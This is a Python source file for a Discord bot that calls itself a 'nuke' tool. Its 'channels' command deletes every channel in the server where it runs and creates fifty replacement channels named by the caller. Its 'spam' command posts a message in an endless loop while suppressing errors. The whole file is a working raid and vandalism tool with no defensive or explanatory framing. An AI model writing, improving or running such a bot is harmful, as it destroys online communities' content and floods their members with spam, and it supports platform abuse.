import discord
from discord import Embed, File
from discord.ext import commands

token = "token"

client = commands.Bot(command_prefix='.')
client.remove_command('help')

@client.event
async def on_ready():
    print("Bot Is Online, Ready to Nuke ;)")

@client.command()
async def channels (ctx, arg1):
    await ctx.message.delete()
    guild = ctx.message.guild
    channels = arg1

    try:
      for channel in ctx.guild.channels:
        await channel.delete()
        print("Channel deleted")

        print("Now Creating channels")
      for i in range(50):
        guild = ctx.message.guild
        await guild.create_text_channel(channels)
        print("Channel created")
    except:
      pass

@client.command()
async def spam (ctx, arg1):
    await ctx.message.delete()
    guild = ctx.message.guild

    while True:
        try:
            await ctx.send(arg1)
        except:
            pass

client.run(token)